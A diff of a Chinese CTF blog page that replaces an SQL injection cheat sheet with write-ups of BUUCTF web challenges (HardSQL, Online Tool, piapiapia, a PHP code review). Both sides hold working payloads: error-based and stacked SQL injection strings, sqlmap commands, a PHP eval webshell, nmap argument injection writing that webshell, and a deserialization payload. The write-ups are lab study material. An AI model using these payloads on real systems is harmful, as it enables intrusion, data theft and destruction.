@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="sql, 黛色若梦">
+    <meta name="keywords" content="buu3, 黛色若梦">
     <meta name="description" content="A Freshman">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>sql | 黛色若梦</title>
+    <title>buu3 | 黛色若梦</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -311,12 +311,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/6.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/17.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">sql</h1>
+                    <h1 class="description center-align post-title">buu3</h1>
                 </div>
             </div>
         </div>
@@ -432,8 +432,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">
-                                <span class="chip bg-color">基础知识</span>
+                            <a href="/tags/ctf%E9%A2%98%E7%9B%AE-web/">
+                                <span class="chip bg-color">ctf题目--web</span>
                             </a>
                         
                     </div>
@@ -448,7 +448,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2022-02-23
+                    2022-03-07
                 </div>
                 
 
@@ -469,120 +469,126 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="sql注入："><a href="#sql注入：" class="headerlink" title="sql注入："></a>sql注入：</h2><p>文中只举例mysql数据库。</p>
-<h3 id="1-原理："><a href="#1-原理：" class="headerlink" title="1.原理："></a>1.原理：</h3><p>客户端数据未经过转义或处理直接带入数据库，造成了sql注入。</p>
-<h3 id="2-常规模板："><a href="#2-常规模板：" class="headerlink" title="2.常规模板："></a>2.常规模板：</h3><h4 id="（1）判断注入点"><a href="#（1）判断注入点" class="headerlink" title="（1）判断注入点"></a>（1）判断注入点</h4><p>字符型：’a’,”a”,(a),(‘a’),(“a”),((“a”)),((‘a’))等。</p>
-<p>数字型：1</p>
-<p>判断：</p>
-<p>一、id=x 加上注释符– （这里是空格，但是在url后要用+），-+，/**/,#(表单常用)</p>
-<p>二、id=1’&amp;&amp;’1’=’1</p>
-<p>id=1’ and ‘1’=’1</p>
-<p>这样构造一个闭合类型。</p>
-<h4 id="（2）获取字段数"><a href="#（2）获取字段数" class="headerlink" title="（2）获取字段数"></a>（2）获取字段数</h4><p>order by </p>
-<p>通过页面变化来查看确定字段数</p>
-<h4 id="（3）一般用联合查询查看显示位"><a href="#（3）一般用联合查询查看显示位" class="headerlink" title="（3）一般用联合查询查看显示位"></a>（3）一般用联合查询查看显示位</h4><p>查看当前数据库</p>
-<p>id=0  union select database(),2,3–+</p>
-<p>爆表：</p>
-<p>id=0 union selelct 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()–+</p>
-<p>爆列：</p>
-<p>0 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’xxx’–+(有时候爆破没有回显还要用十六进制试一下)</p>
-<p>爆字段：</p>
-<p>0 union select 1,2,group_concat(id,’~’,user) from (表名)–+</p>
-<h3 id="3-类型："><a href="#3-类型：" class="headerlink" title="3.类型："></a>3.类型：</h3><p>（1）参数：字符型，数字型</p>
-<p>（2）提交方式：post，get，cookie，X-Forward-For,User-Agent请求头</p>
-<h4 id="（3）注入方式与应用场景："><a href="#（3）注入方式与应用场景：" class="headerlink" title="（3）注入方式与应用场景："></a>（3）注入方式与应用场景：</h4><h5 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h5><p>如以上所示，但是要注意的是可能出现一些waf（正则或转义或过滤）阻止我们使用union，这时候我们就根据不同的可能性选择不同方法。这种时候绝大多数是找到一种其他的方法来注入。</p>
-<h5 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h5><p>这种题目特征是只有判断出内容真假的回显，没有回显打印内容，报错出内容</p>
-<p>具体的函数作用内容在lesson1-10，我就不赘述了。</p>
-<p>然后我们看一下padload：</p>
-<p>updatexml或extractvalue</p>
-<p>爆表</p>
-<p>0 and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))–+</p>
-<p>爆列</p>
-<p>0 and extractvalue(1,concat(0x7e,(select group_concat(column_name) from imformation_schema.columns where table_name=’xxx’)))–+</p>
-<p>爆字段</p>
-<p>0 and extractvalue(1,concat(0x7e,(select group_concat(xx,0x7e,xx) from table)))–+</p>
-<p>但是问题是这些函数只能查询32位，所以我们要用substr()或mid(xxx,33,32)从33位开始截取。</p>
-<h5 id="多语句注入（堆叠注入）"><a href="#多语句注入（堆叠注入）" class="headerlink" title="多语句注入（堆叠注入）"></a>多语句注入（堆叠注入）</h5><p>原因：没有经过严格过滤mysqli_multi_query函数，可以执行多条SQL语句。mysql_real_escape_string()转义过滤。</p>
-<p>用;隔开每一个输入语句，有存在局限的就是它其实如果权限不足会导致无法修改数据。</p>
-<p>如:</p>
-<p>id=1”;WAITFOR DELAY ‘0:0:3’;delete from users; –+id=1’;select if(length(user(),1,1)&gt;1,sleep(3),1) %23’;select if(length((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)&gt;1,sleep(3),1) %23</p>
-<h5 id="内联注入"><a href="#内联注入" class="headerlink" title="内联注入"></a>内联注入</h5><p>这是一种waf的绕过姿势。</p>
-<p>id=-1 /!UNION/ /!SELECT/ 1,2,3</p>
-<p>会执行/!/里面的内容。</p>
-<h5 id="二次编码注入"><a href="#二次编码注入" class="headerlink" title="二次编码注入"></a>二次编码注入</h5><p>代码中有urldecode() 函数</p>
-<p>%2527 先解码成%27再解码成’单引号</p>
-<p>sqlmap -u <a target="_blank" rel="noopener" href="http://192.168.100.141/index.php/author=123">http://192.168.100.141/index.php/author=123</a> –prefix “%2527” –suffix “%23”<br>-prefix为设置前缀 -suffix为设置后缀</p>
-<p>设置后缀，防止sqlmap使用内联注</p>
-<h5 id="布尔注入"><a href="#布尔注入" class="headerlink" title="布尔注入"></a>布尔注入</h5><p>报错注入的情况也适用于布尔盲注（只有判断出内容真假的回显，没有回显打印内容），了解一下基本过程然后直接上脚本爆破。</p>
-<p>利用substr()来使用截取判断，还可以用ascii()将其转换成数字，然后就可以用二分法。脚本只是模板，具体情况要根据题目的waf等来判断实现。</p>
-<h5 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h5><p>适用于与bool一样（只有判断出内容真假的回显，没有回显打印内容）</p>
-<p>利用if()和sleep()函数来实现</p>
-<p>Sleep()  :延迟函数</p>
-<p> <strong>If</strong>(condition,true,false) :条件语句 </p>
-<h5 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h5><p>原理是先编码后转义，GBK 占用两字节</p>
-<p>ASCII占用一字节</p>
-<p>PHP中编码为GBK，函数执行添加的是ASCII编码（添加的符号为“\”），MYSQL默认字符集是GBK等宽字节字符集。</p>
-<p>大家都知道%df’ 被PHP转义（开启GPC、用addslashes函数，或者icov等），单引号被加上反斜杠\，变成了 %df\’，其中\的十六进制是 %5C ，那么现在 %df\’ =%df%5c%27，如果程序的默认字符集是GBK等宽字节字符集，则MySQL用GBK的编码时，会认为 %df%5c 是一个宽字符，也就是縗，也就是说：%df\’ = %df%5c%27=縗’，有了单引号就好注入了。</p>
-<p>如列数测试：</p>
-<p>id=%df%27 union select 1,2%23</p>
-<p>预防：使用mysql_set_charset(GBK)指定字符集</p>
-<p>使用myql_real_escape_string()进行转义，他会考虑当前字符集设置</p>
-<h5 id="二次转义注入"><a href="#二次转义注入" class="headerlink" title="二次转义注入"></a>二次转义注入</h5><p>后端（PHP）代码对语句进行了转义</p>
-<p>保存进数据库（mysql）时没有转义，是原语句</p>
-<p>‘#被转义成了其他的东西，所以一次注入无效。<br>但是在保存进数据库的时候，还是admin ‘#。</p>
-<p>那么修改密码时的语句如下：</p>
-<p>update users set  password=’123’ where username=’admin ‘#’<br>所以你以为修改的是admin ‘#的账号，但是数据库理解成要修改密码的账号是admin。</p>
-<h3 id="4-一些waf类型"><a href="#4-一些waf类型" class="headerlink" title="4.一些waf类型"></a>4.一些waf类型</h3><p>过滤掉什么：</p>
-<p>flag   union  ‘  ,  </p>
-<p>这里分成白盒和黑盒</p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/cute-puli/p/11146625.html">SQL注入绕过waf的一万种姿势 - 铺哩 - 博客园 (cnblogs.com)</a></p>
-<p><a href="https://link.csdn.net/?target=https://www.cnblogs.com/backlion/p/8622523.html">(47条消息) csdn - 安全中心</a></p>
-<h3 id="5-解题流程"><a href="#5-解题流程" class="headerlink" title="5.解题流程"></a>5.解题流程</h3><p>更准确的说可以说是题目类型，怎么去判断属于什么类型的题目。遇到参数，表单，过滤可能性。</p>
-<h3 id="6-脚本和sqlmap格式"><a href="#6-脚本和sqlmap格式" class="headerlink" title="6.脚本和sqlmap格式"></a>6.脚本和sqlmap格式</h3><p>sqlmap用法<br>爆库：</p>
-<p>python sqlmap.py -u <a target="_blank" rel="noopener" href="http://xxxxxx/?id=1">http://xxxxxx?id=1</a> –dbs</p>
-<p>爆表：</p>
-<p>python sqlmap.py <a target="_blank" rel="noopener" href="http://xxxxx/?id=1">http://xxxxx?id=1</a> -D xxxx –tables</p>
-<p>爆列：</p>
-<p>python sqlmap.py <a target="_blank" rel="noopener" href="http://xxx/?id=1">http://xxx?id=1</a> -D xxxx -T xxxx –columns</p>
-<p>爆字段：</p>
-<p>python sqlmap.py <a target="_blank" rel="noopener" href="http://xxx/?id=1">http://xxx?id=1</a> -D xxxx -T xxxx -C xxxx –dump</p>
-<p><strong>文件包含：</strong></p>
-<p>?file=XXX.php等是典型的文件包含</p>
-<p>PHP伪协议（文件读取）</p>
-<p>#第一种用法:<br>?file=php://filter/convert.base64-encode/resouce=xxx.php?<br>第二种用法:<br>?file=php://filter/read=convert.base64-encode/resource=xxx.php<br>————————————————</p>
-<h6 id="2-php-input"><a href="#2-php-input" class="headerlink" title="2.php://input"></a>2.php://input</h6><p>代码：?file=php://input<br>在url上后接，之后利用Hackbar通过POST把数据传过去</p>
-<p><strong>PHP小trick：</strong></p>
-<p>一种是md5()函数无法处理数组，所以我们传入数组，会返回NULL，所以两个数组经过加密后得到的都是NULL，也就是相等的。</p>
-<p>所以我们可以试试kkeyey1[]=some&amp;kekeyy2[]=lie</p>
-<p>另一种就是之前常用的利用==弱比较，我们常用的两个字符经过MD5加密后的值为0exxxx形式，会被认为是科学计数法，且表示的是0*10的xxx次方，还是零，都是相等的。</p>
-<p>可以套一些</p>
-<p>下列的字符串的MD5值都是0e开头的：</p>
-<p>QNKCDZO</p>
-<p>240610708</p>
-<p>s878926199a</p>
-<p>s155964671a</p>
-<p>s214587387a</p>
-<p>s214587387a</p>
-<p>过滤&lt;?php。</p>
-<p>这一题学到了的是怎么绕过过滤关键字的方法：试试其他的php标记写法</p>
-<p>用网页脚本:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;php&quot;&gt;@eval($_POST[&#x27;a&#x27;])&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+                <h1 id="buu3"><a href="#buu3" class="headerlink" title="buu3"></a>buu3</h1><h5 id="1-极客大挑战-2019-HardSQL"><a href="#1-极客大挑战-2019-HardSQL" class="headerlink" title="1.极客大挑战 2019]HardSQL"></a>1.极客大挑战 2019]HardSQL</h5><p>这一题有过滤一些and这样的函数，然后判断一下常用方法，所以用报错注入。</p>
+<p><a target="_blank" rel="noopener" href="http://ff7a0f57-d7f6-4ced-8ecf-788b48ecc4dc.node4.buuoj.cn:81/check.php?username=admin&#39;or(extractvalue(1,concat(0x7e,(select(table_name)from(information_schema.tables)where(table_schema)like(database())))))%23&amp;password=1234">http://ff7a0f57-d7f6-4ced-8ecf-788b48ecc4dc.node4.buuoj.cn:81/check.php?username=admin&#39;or(extractvalue(1,concat(0x7e,(select(table_name)from(information_schema.tables)where(table_schema)like(database())))))%23&amp;password=1234</a></p>
+<p><a target="_blank" rel="noopener" href="http://ff7a0f57-d7f6-4ced-8ecf-788b48ecc4dc.node4.buuoj.cn:81/check.php?username=admin&#39;or(extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;H4rDsq1&#39;)))))%23">http://ff7a0f57-d7f6-4ced-8ecf-788b48ecc4dc.node4.buuoj.cn:81/check.php?username=admin&#39;or(extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;H4rDsq1&#39;)))))%23</a><br>&amp;password=1234</p>
+<p><a target="_blank" rel="noopener" href="http://ff7a0f57-d7f6-4ced-8ecf-788b48ecc4dc.node4.buuoj.cn:81/check.php?username=admin&#39;or(extractvalue(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1)))))%23">http://ff7a0f57-d7f6-4ced-8ecf-788b48ecc4dc.node4.buuoj.cn:81/check.php?username=admin&#39;or(extractvalue(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1)))))%23</a><br>&amp;password=1234</p>
+<p>只出一半，所以right()，从右边截取，这里可能是限制了select的数据长度<br>这里可以用right（）,是从后面开始向前截取的</p>
+<p><a target="_blank" rel="noopener" href="http://ff7a0f57-d7f6-4ced-8ecf-788b48ecc4dc.node4.buuoj.cn:81/check.php?username=admin&#39;or(extractvalue(1,concat(0x7e,(select(group_concat(right(password,50)))from(H4rDsq1)))))%23">http://ff7a0f57-d7f6-4ced-8ecf-788b48ecc4dc.node4.buuoj.cn:81/check.php?username=admin&#39;or(extractvalue(1,concat(0x7e,(select(group_concat(right(password,50)))from(H4rDsq1)))))%23</a><br>&amp;password=1234</p>
+<p>updatexml()做法：</p>
+<p>[(50条消息) <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42513429/article/details/105517617?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_title~default-4.pc_relevant_default&spm=1001.2101.3001.4242.3&utm_relevant_index=7">极客大挑战 2019]HardSQL_sillyboy_lch的博客-CSDN博客</a></p>
+<p>flag{dd6fd030-c9ca-47a9-92ce-16</p>
+<p>0-c9ca-47a9-92ce-1681851ac8c8}</p>
+<p>=》flag{dd6fd030-c9ca-47a9-92ce-1681851ac8c8}</p>
+<hr>
+<p>【代码审计】</p>
+<h5 id="2-BUUCTF-2018-Online-Tool"><a href="#2-BUUCTF-2018-Online-Tool" class="headerlink" title="2.BUUCTF 2018]Online Tool"></a>2.BUUCTF 2018]Online Tool</h5><p>代码执行漏洞（RCE）</p>
+<p>开篇是代码，即需要我们审计然后得到flag，这种题目要懂得找关键函数。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;])) &#123; </span><br><span class="line">$_SERVER[&#x27;REMOTE_ADDR&#x27;] </span><br><span class="line">=$_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">知识点：</span><br><span class="line">/*HTTP 请求头中的 Remote_Addr表示发出请求的远程主机的 IP 地址.如果你用了某个代理，那么你的浏览器会先访问这个代理，然后再由这个代理转发到网站，这样web服务器就会把remote_addr设为这台代理机器的IP，</span><br><span class="line">X-Forwarded-For它代表客户端，也就是HTTP的请求端真实的IP，</span><br><span class="line">X-Real-IP多个代理时候，可以在第一个反向代理上配置“proxy_set_header X-Real-IP $remote_addr” 获取真实客户端IP</span><br><span class="line">*/</span><br><span class="line">参照博客https://www.cnblogs.com/luxiaojun/p/10451860.html</span><br><span class="line"></span><br><span class="line">//不过这里并不是考点</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(!isset($_GET[&#x27;host&#x27;])) &#123;  highlight_file(__FILE__);</span><br><span class="line">&#125; else &#123;  </span><br><span class="line">$host = $_GET[&#x27;host&#x27;];  </span><br><span class="line">$host = escapeshellarg($host);  </span><br><span class="line">$host = escapeshellcmd($host); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">知识点：</span><br><span class="line">/*escapeshellarg():</span><br><span class="line">给字符串增加一个 单引号 并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 命令执行函数，并且还是确保安全的。shell 命令执行函数包含 exec(), system() 执行运算符 (反引号)</span><br><span class="line">输入：</span><br><span class="line">&lt;?php</span><br><span class="line">$a=&quot;172.17.0.2&#x27; -v -d a=1&quot;;</span><br><span class="line">$b=escapeshellarg($a);</span><br><span class="line">echo $a.&quot;&lt;br/&gt;&quot;.$b.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">输出：</span><br><span class="line">172.17.0.2&#x27; -v -d a=1</span><br><span class="line">&#x27;172.17.0.2&#x27;\&#x27;&#x27; -v -d a=1&#x27;</span><br><span class="line">先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。</span><br><span class="line">escapeshellcmd：</span><br><span class="line">escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。</span><br><span class="line">反斜线（\）会在以下字符之前插入：</span><br><span class="line">&amp;#;`|*?~&lt;&gt;^()[]&#123;&#125;$ \, \x0A（换行） 和 \xFF</span><br><span class="line">’ 和 &quot; 仅在不配对（中间没有字符，即没有配对）的时候被转义。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。*/</span><br><span class="line">escapeshellcmd() 和 escapeshellarg() 一起出现会有什么问题呢，详见这篇博客(注意仅仅适合escapeshellarg在escapeshellcmd前面)：https://blog.csdn.net/qq_45521281/article/details/106236200</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$sandbox = md5(&quot;glzjin&quot;. $_SERVER[&#x27;REMOTE_ADDR&#x27;]);  </span><br><span class="line">echo &#x27;you are in sandbox &#x27;.$sandbox;  @mkdir($sandbox);  </span><br><span class="line">chdir($sandbox);  </span><br><span class="line">echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">知识点：</span><br><span class="line">system来执行命令，而且有传参，肯定有利用这里</span><br><span class="line"></span><br><span class="line">代码的本意是希望我们输入ip这样的参数做一个扫描，通过上面的两个函数来进行规则过滤转译，我们的输入会被单引号引起来，但是因为上面的两个函数连起来用会有像上文一样的漏洞所以我们可以逃脱这个引号的束缚。</span><br><span class="line">系统命令没办法注入|&amp;这样的，因为后一个函数还是会转义。</span><br><span class="line">所以关键是nmap函数</span><br><span class="line">nmap基本功能有三个，一是探测一组主机是否在线；其次是扫描 主机端口，嗅探所提供的网络服务；还可以推断主机所用的操作系统</span><br><span class="line">常见命令：https://blog.csdn.net/weixin_45551083/article/details/106967465</span><br><span class="line">发现在nmap命令中 有一个参数-oG可以实现将命令和结果写到文件，所以想到写一句话木马。</span><br></pre></td></tr></table></figure>
 
-<h5 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h5><p>1.piapiapia</p>
-<p>buu自带防扫机制，所以我们没有办法扫得很快</p>
-<p>看看能不能扫出源码，看是白盒（源码泄漏+代码审计）还是黑盒（这里由于字典的稀缺，所以两种都试试）</p>
-<p>fuzz用社区版，因为线程比较小，不然速度太快了。</p>
-<ul>
-<li>-u 指定网址</li>
-<li>-e 指定网站语言</li>
-<li>-w 指定字典</li>
-<li>-r 递归目录（跑出目录后，继续跑目录下面的目录）</li>
-<li>–random-agents 使用随机UA</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -u 网址 -e php</span><br></pre></td></tr></table></figure>
+<p><img src="/images/3.5.png" alt="3.5"></p>
+<p>这里的代码调试其实可以在本地linux环境里运行，之前自己是在网上用在线代码运行工具调试，使得文件名hack.php完整，但是这里要有环境，在线工具提供不了。</p>
+<p>“nmap -T5 -sT -Pn –host-timeout 2 -F “.$host</p>
+<p>?host=’ <?php @eval($_POST["hack"]);?> -oG hack.php ‘</p>
+<p>这里的过程怎么理解呢：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">123&#x27; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &#x27; ---&gt; &#x27;123&#x27;\&#x27;&#x27; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &#x27;\&#x27;&#x27;&#x27;(每转义一个单引号 单引号前后部分都用单引号括起来</span><br><span class="line">&#x27;123&#x27;\&#x27;&#x27; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &#x27;\&#x27;&#x27;&#x27; ---&gt; &#x27;123&#x27;\\&#x27;&#x27; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &#x27;\\&#x27;&#x27;&#x27;(偶数单引号 两两配对</span><br></pre></td></tr></table></figure>
 
-<p>py dirsearch.py -u 网址 -e 语言(我一般用*)</p>
-<p>一般出现登录页面都会有注册页面</p>
+<p>然后一句话连接到上传目录里的shell文件即可。</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_26406447/article/details/100711933">(50条消息) BUUCTF 2018 Online Tool_kid的博客-CSDN博客_buuctf</a></p>
+<h5 id="3-0CTF-2016-piapiapia"><a href="#3-0CTF-2016-piapiapia" class="headerlink" title="3.[0CTF 2016]piapiapia"></a>3.[0CTF 2016]piapiapia</h5><p>php反序列化漏洞</p>
+<p>有时候是要点耐心才能把题目做出来，这里第一步的扫后台字典太多了，往往又有可能在很后面，所以我们不要着急，让他扫完最后再在log里面找状态码为200的文件。</p>
+<p>打开压缩包后在config.php里面找到flag为空，flag应该在服务器的config.php文件中，要找可以利用的漏洞读取服务器的flag。</p>
+<p>然后翻阅一下剩下的PHP文件发现proflie里有进行了PHP反序列化并且这里的file_get_contents()还可以报出文件源码，所以猜测让这个函数去爆出config.php里的源码。</p>
+<p>这一题因为含有过滤机制filter所以我们很容易想到说要用字符串逃逸的方法。然后怎么逃逸主要还是要看函数判断时的一些绕过技巧。利用点在第二个过滤上，因为第一个替换并不会增加任何长度，where是唯一一个长度发生改变的替换词。那么通过构造特定长度的where序列，由于过滤机制会自动填充，从而把原本是nickname的字段会溢出到photo字段去，从而覆盖了原来的photo属性 。</p>
+<h5 id="4-BUU-CODE-REVIEW-1"><a href="#4-BUU-CODE-REVIEW-1" class="headerlink" title="4.BUU CODE REVIEW 1"></a>4.BUU CODE REVIEW 1</h5><?php
+/**
+ * Created by PhpStorm.
+ * User: jinzhao
+ * Date: 2019/10/6
+ * Time: 8:04 PM
+ */
+
+highlight_file(__FILE__);
+
+class BUU {
+   public $correct = "";
+   public $input = "";
+
+   public function __destruct() {
+       try {
+           $this->correct = base64_encode(uniqid());
+
+//uniqid() 函数基于以微秒计的当前时间，生成一个唯一的 ID。
+
+​           if($this->correct === $this->input) {
+​               echo file_get_contents("/flag");
+​           }
+​       } catch (Exception $e) {
+​       }
+   }
+}
+
+if($_GET['pleaseget'] === '1') {
+    if($_POST['pleasepost'] === '2') {
+        if(md5($_POST['md51']) == md5($_POST['md52']) && $_POST['md51'] != $_POST['md52']) {
+            unserialize($_POST['obj']);
+        }
+    }
+}
+
+
+
+GET提交：?pleaseget=1
+POST提交的第一部分：pleasepost=2&md51[]=1&md52[]=2
+POST提交的第二部分：一个BUU类的实例化对象，且两个属性值在经过$this->correct = base64_encode(uniqid());这个之后，依然全等，那么这里我们可以把变化的$correct属性的**引用赋值**（=&）给属性$input
+//**传值赋值**：变量默认总是传值赋值。那也就是说，当将一个表达式的值赋予一个变量时，整个原始表达式的值被赋值到目标变量。这意味着，例如，当一个变量的值赋予另外一个变量时，改变其中一个变量的值，将不会影响到另外一个变量。
+//**引用赋值**：PHP 也提供了另外一种方式给变量赋值：引用赋值。这意味着新的变量简单的引用（换言之，“成为其别名” 或者 “指向”）了原始变量。改动新的变量将影响到原始变量，反之亦然。
+
+通过[$a=&test()](https://www.cnblogs.com/lovesg/p/5109053.html)方式调用函数呢, 他的作用是　将return $b中的　$b变量的内存地址与$a变量的内存地址　指向了同一个地方 
+即产生了相当于这样的效果($a=&b;) 所以改变$a的值　也同时改变了$b的值。
+
+
+
+
+
+这是一道相当简单的PHP代码审计。主要考察PHP代码审计和PHP函数弱比较绕过。
+
+padload：
+
+get：
+
+pleaseget=1
+
+post
+
+pleasepost=2&md51[]=1&md52=2&obj=一个BUU类的实例化对象
+
+怎么编写：
+
+seay代码运行模块：
+
+直接复制下来魔术方法调用过程：
+
+<?php
+class BUU {
+   public $correct = "";
+   public $input = "";
+
+ /*  public function __destruct() {
+       try {
+           $this->correct = base64_encode(uniqid());
+           if($this->correct === $this->input) {
+               echo file_get_contents("/flag");
+           }*/
+       }
+
+$c = new BUU();
+$c->input=&$c->correct;
+$c = serialize($c);
+echo $c;
+
+
+
 
                 
             </div>
@@ -609,7 +615,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2022/02/23/%E5%A4%8D%E4%B9%A0%E9%A2%98%E5%8F%8A%E8%A1%A5%E5%85%85%E7%9F%A5%E8%AF%86%E7%82%B9/">http://example.com/2022/02/23/%E5%A4%8D%E4%B9%A0%E9%A2%98%E5%8F%8A%E8%A1%A5%E5%85%85%E7%9F%A5%E8%AF%86%E7%82%B9/</a>
+                    <a href="http://example.com/2022/03/07/buu3/">http://example.com/2022/03/07/buu3/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -647,8 +653,8 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">
-                                    <span class="chip bg-color">基础知识</span>
+                                <a href="/tags/ctf%E9%A2%98%E7%9B%AE-web/">
+                                    <span class="chip bg-color">ctf题目--web</span>
                                 </a>
                             
                         </div>
@@ -824,13 +830,13 @@
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
             <div class="card">
-                <a href="/2022/03/01/%E8%80%83%E6%A0%B8wp/">
+                <a href="/2022/03/13/php%E4%BB%A3%E7%A0%81%E7%8E%AF%E5%A2%83/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="考核wp">
+                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="php代码环境">
                         
-                        <span class="card-title">考核wp</span>
+                        <span class="card-title">php代码环境</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -841,7 +847,7 @@
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-03-01
+                            <i class="far fa-clock fa-fw icon-date"></i>2022-03-13
                         </span>
                         <span class="publish-author">
                             
@@ -850,6 +856,14 @@
                             
                         </span>
                     </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
+                        <span class="chip bg-color">php代码审计</span>
+                    </a>
+                    
                 </div>
                 
             </div>
@@ -861,13 +875,13 @@
                 Next&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/02/18/web%E5%89%8D%E7%AB%AF--html%E8%AF%AD%E8%A8%80/">
+                <a href="/2022/03/05/Linux-windows%E6%8C%87%E4%BB%A4/">
